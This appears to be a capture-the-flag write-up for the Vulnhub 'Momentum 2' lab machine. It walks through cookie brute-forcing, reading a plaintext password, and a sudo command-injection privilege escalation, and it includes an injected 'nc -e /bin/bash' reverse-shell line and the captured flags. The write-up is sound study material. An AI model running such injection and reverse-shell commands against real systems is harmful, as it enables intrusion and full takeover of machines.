@@ -1,0 +1,135 @@
+========================================== 
+|               Enumeration              |
+========================================== 
+
+*** Only port 22 and 80 are open (see nmap result scan).
+*** Four intersting URIs were found from gobuster crawling result : /ajax.php, /ajax.php.bak, /owls, /dashboard.html
+	# /dashboard.html hoat a post upload form controlled by ajax.php.
+	# after dowloading this piece code shows that a bruteforce action must be taken to determine the cookie of the admin:
+
+    //The boss told me to add one more Upper Case letter at the end of the cookie
+   if(isset($_COOKIE['admin']) && $_COOKIE['admin'] == '&G6u@B6uDXMq&Ms'){
+
+       //[+] Add if $_POST['secure'] == 'val1d'
+        $valid_ext = array("pdf","php","txt");
+   }
+   else{
+
+        $valid_ext = array("txt");
+   }
+
+   // Remember success upload returns 1
+
+	 ==> for this purpose we used Burpsuire intruder to bruteforce it (see BRUTEFORCE_INTRUDER_ATTACK_SETTINGS.png)	
+	 ==> admin=&G6u@B6uDXMq&MsR is the right cookie
+
+ ========================================== 
+|               Exploitation              |
+ ========================================== 
+
+*** let's upload a reverse shell a reverse shell with the existing working cookie:
+a quick lookup at the home shows that athena stored a password in plain text within the file password-reminder.txt
+  
+$ ls -laR /home/*
+/home/athena:
+total 32
+drwxr-xr-x 3 athena athena 4096 May 27 18:26 .
+drwxr-xr-x 4 root   root   4096 May 27 16:30 ..
+-rw-r--r-- 1 athena athena  220 May 25 12:15 .bash_logout
+-rw-r--r-- 1 athena athena 3526 May 25 12:15 .bashrc
+drwxr-xr-x 3 athena athena 4096 May 27 16:58 .local
+-rw-r--r-- 1 athena athena  807 May 25 12:15 .profile
+-rw-r--r-- 1 athena athena   37 May 27 17:04 password-reminder.txt
+-rw-r--r-- 1 root   root    241 May 27 17:09 user.txt
+
+/home/athena/.local:
+total 12
+drwxr-xr-x 3 athena athena 4096 May 27 16:58 .
+drwxr-xr-x 3 athena athena 4096 May 27 18:26 ..
+drwx------ 3 athena athena 4096 May 27 16:58 share
+ls: cannot open directory '/home/athena/.local/share': Permission denied
+
+/home/team-tasks:
+total 16
+drwxr-xr-x 2 root root 4096 May 27 16:53 .
+drwxr-xr-x 4 root root 4096 May 27 16:30 ..
+-rw-r--r-- 1 root root  402 May 27 16:53 cookie-gen.py
+-rw-r--r-- 1 root root    0 May 27 16:53 log.txt
+-rw-r--r-- 1 root root  151 May 27 16:33 note.txt
+
+
+$ cat password-reminder.txt
+password : myvulnerableapp[Asterisk]
+
+==> the password of the user athena is myvulnerable*
+
+athena@momentum2:~$ cat user.txt
+/                         \
+~ Momentum 2 ~ User Owned ~
+\                         /
+
+---------------------------------------------------
+FLAG : 4WpJT9qXoQwFGeoRoFBEJZiM2j2Ad33gWipzZkStMLHw
+---------------------------------------------------
+
+
+ ========================================== 
+|             Post-Exploitation           |
+ ========================================== 
+
+*** athena has the right to use sudo to execute on cookie-gen.py as follow:
+
+thena@momentum2:~$ sudo -l
+Matching Defaults entries for athena on momentum2:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User athena may run the following commands on momentum2:
+    (root) NOPASSWD: /usr/bin/python3 /home/team-tasks/cookie-gen.py
+
+this program generate a cookie 
+athena@momentum2:~$ sudo /usr/bin/python3 /home/team-tasks/cookie-gen.py
+~ Random Cookie Generation ~
+[!] for security reacsons we keep logs about cookie seeds.
+Enter the seed : 2
+d$DOfJXRJbfaWTWFYFQG
+
+*** Thinkings as OS command injection is the the right way to exploit this vulnerability.
+
+athena@momentum2:~$ sudo /usr/bin/python3 /home/team-tasks/cookie-gen.py
+~ Random Cookie Generation ~
+[!] for security reasons we keep logs about cookie seeds.
+Enter the seed : 2;id;
+VbUMATcSEYaKZECQfOIM
+athena@momentum2:~$ 2
+uid=0(root) gid=0(root) groups=0(root)
+
+*** WE poped out a reverse shell on port 5555
+
+athena@momentum2:~$ sudo /usr/bin/python3 /home/team-tasks/cookie-gen.py
+~ Random Cookie Generation ~
+[!] for security reasons we keep logs about cookie seeds.
+Enter the seed : 2;nc -e /bin/bash 192.168.159.144 5555;
+ZTaAJMdLfAOX#bfgX@eJ
+athena@momentum2:~$ 2
+
+root@black-sh:~/Vulnhub/momentum/2# nc -lvnp 5555
+listening on [any] 5555 ...
+connect to [192.168.159.144] from (UNKNOWN) [192.168.159.137] 39570
+id
+uid=0(root) gid=0(root) groups=0(root)
+cd /root
+cat root.txt;id;hostname
+//                    \\
+}  Rooted - Momentum 2 {
+\\                    //
+
+---------------------------------------------------
+FLAG : 4bRQL7jaiFqK45dVjC2XP4TzfKizgGHTMYJfSrPEkezG
+---------------------------------------------------
+
+
+by Alienum with <3
+uid=0(root) gid=0(root) groups=0(root)
+momentum2
+
+
